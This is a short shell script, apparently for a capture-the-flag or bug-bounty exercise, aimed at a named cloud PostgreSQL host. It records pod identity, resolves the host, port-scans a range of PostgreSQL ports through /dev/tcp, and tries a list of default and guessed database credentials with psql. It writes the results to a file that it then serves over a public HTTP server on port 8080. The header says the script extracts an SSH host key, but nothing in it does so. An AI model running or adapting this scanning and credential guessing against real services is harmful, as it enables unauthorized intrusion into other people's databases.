#!/bin/sh
# CTF: extract ed25519 SSH host key of falcon-bug-bounty-flag-pgsql-dev-sandbox
HOST=falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com
{
  echo "=== POD ==="; id; hostname
  echo "=== resolve falcon from VPC ==="
  getent hosts $HOST || echo "no DNS"; echo "IP: $(getent hosts $HOST | awk '{print $1}')"
  echo "=== port scan falcon (PG range) ==="
  for p in 5432 5433 5439 21910 21911 21912 21913 21914 21915 21916 21917 21918 21919 21920 21921 21922 21923 21924 21925 21926 21927 21928 21929 21930 22 21910; do
    (echo > /dev/tcp/$HOST/$p) 2>/dev/null && echo "  $p OPEN"
  done
  echo "=== try PG login (common creds) ==="
  for creds in "avnadmin:avnadmin" "avnadmin:password" "postgres:postgres" "avnadmin:" "avnadmin:AVNS_falcon" "avnadmin:falcon"; do
    u=${creds%%:*}; pw=${creds#*:}
    for p in 5432 21911 21912 21913; do
      out=$(timeout 6 psql "host=$HOST port=$p user=$u password=$pw dbname=postgres sslmode=disable connect_timeout=5" -tAc "SELECT 1" 2>&1)
      echo "$out" | grep -q "1" && echo "  HIT $u@$p => $out"
    done
  done
  echo "=== END SCAN ==="
} > /app/ctf.txt 2>&1
printf 'CTF scan done\n' > /app/index.html
exec python3 -m http.server 8080
